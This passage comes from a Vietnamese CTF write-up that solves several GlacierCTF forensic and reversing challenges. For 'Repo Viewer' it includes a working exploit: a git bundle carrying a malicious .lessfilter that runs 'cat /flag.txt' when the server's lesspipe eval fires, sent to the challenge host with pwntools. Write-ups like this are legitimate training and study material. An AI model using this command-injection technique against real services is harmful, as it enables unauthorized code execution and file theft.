![image](https://hackmd.io/_uploads/r1rodb4WWg.png)
Chúng ta có thể lấy được flag với chương trình `shit` trong folder `carpet`.
![image](https://hackmd.io/_uploads/HkYJtW4-be.png)
**Flag**: `gctf{0113_wh0_g1t_r3s3t3d_th3_c4t_4789}`

## findme v2
Challenge cho chúng ta một file pdf, khi mở lên thì file pdf không có gì đặc biệt.
![image](https://hackmd.io/_uploads/SysnYb4W-e.png)
Nhưng khi check bằng `pdf-parser` ở object 130 của file thì chúng ta sẽ thấy được một file PNG.
![image](https://hackmd.io/_uploads/HJDK5-Ebbe.png)
Ta có thể extract file ra bằng command:
`pdf-parser.py --filter --raw -o 130 -d flag.png chall.pdf`
![image](https://hackmd.io/_uploads/r1AYo-N--g.png)

![flag](https://hackmd.io/_uploads/BJZ3sZVbbg.png)

## RFC 1035
Challenge cho chúng ta một file binary, khi chạy chúng ta sẽ thấy được nó đang mở một file flag.png.
Khi reverse file, đầu tiên chúng ta sẽ thấy được ở hàm `main_main` file này sẽ tạo một dns server chạy trên TCP từ repo của [miekg](https://github.com/miekg/dns).
![image](https://hackmd.io/_uploads/rybQgMEZZg.png)
Tiếp theo, ở hàm `main_handleDnsRequest` chúng ta sẽ thấy nó đang trỏ tới một domain là `flag.example.com` 
![image](https://hackmd.io/_uploads/HySDgMNbbx.png)
Ngoài ra, nó sẽ sử dụng record `TXT` để gửi data của file `png`.
![image](https://hackmd.io/_uploads/HJD3-fNZ-l.png)
Như vậy chúng ta sẽ cần sử dụng server DNS từ đề bài là `challs.glacierctf.com:13381` với TCP để resolve domain `flag.example.com`.
![image](https://hackmd.io/_uploads/HyKCWM4-Wl.png)

Solve script:
```python!
import dns.message
import dns.query
import dns.rdatatype
import socket  

SERVER_HOST = "challs.glacierctf.com"
SERVER_PORT = 13381
TARGET_DOMAIN = "flag.example.com."

data = None

def main():
    try:
        server_ip = socket.gethostbyname(SERVER_HOST)
        print(f"[*] Resolved {SERVER_HOST} -> {server_ip}")

        query = dns.message.make_query(TARGET_DOMAIN, dns.rdatatype.TXT)

        response = dns.query.tcp(query, server_ip, port=SERVER_PORT, timeout=10)
        
        print("[*] Received DNS response")
        
        with open("flag.png", "wb") as f:
            for rrset in response.answer:
                for rdata in rrset:
                    for part in rdata.strings:
                        if isinstance(part, str):
                            part = part.encode()   
                        f.write(part)  
        print("[*] Flag written to flag.png")

    except Exception as e:
        print(f"[ERROR] {e}")

if __name__ == "__main__":
    main()
```
![image](https://hackmd.io/_uploads/BkqLGGVWWg.png)

## Repo Viewer


Challenge tại đây:

```bash
#!/bin/bash

set -euo pipefail

echo "Welcome to the Repo Viewer!"
echo "Submit a git bundle to view its README"
echo "Sample command: git clone <repo_url> . && git bundle create repo.bundle --all && (cat repo.bundle | base64; echo @) | wl-copy"
echo "Confirm with extra newline after base64 data."
echo "Input base64-encoded git bundle:"
read -d @ bundledata
printf %s "${bundledata}" | base64 -d > /tmp/repo.bundle
git clone /tmp/repo.bundle .

# lock down less
eval $(lesspipe)
cp  /data/.lesskey .lesskey

if [ -L README.md ]; then
    echo "No funny business!"
    exit 1
fi 

less README.md
```

Có thể thấy hàm eval khá khả nghi

sau khi đọc doc thì mình có thể override lesspipe sử dụng một file là .lessfilter: https://www.commandlinux.com/man-page/man1/lesspipe.1.html

Solve script của mình:

```python
from pwn import *
import os
import subprocess
import base64

os.makedirs("repo-exploit", exist_ok=True)
os.chdir("repo-exploit")

subprocess.run(["git", "init"], check=True)

with open("README.md", "w") as f:
    f.write("# Hello\n")

with open(".lessfilter", "w") as f:
    f.write("#!/bin/sh\ncat /flag.txt\nexit 0\n")
os.chmod(".lessfilter", 0o755)

subprocess.run(["git", "add", "README.md", ".lessfilter"], check=True)
subprocess.run([
    "git",
    "-c", "user.name=me",
    "-c", "user.email=me@me",
    "commit",
    "-m", "add lessfilter",
    "--no-gpg-sign"
], check=True)

subprocess.run(["git", "bundle", "create", "repo.bundle", "--all"], check=True)

with open("repo.bundle", "rb") as f:
    payload = base64.b64encode(f.read()) + b"\n@\n"

print(payload)

io = remote("challs.glacierctf.com", 13372)
io.send(payload)
io.interactive()
```

![image](https://hackmd.io/_uploads/Sy1S2ZMWbl.png)
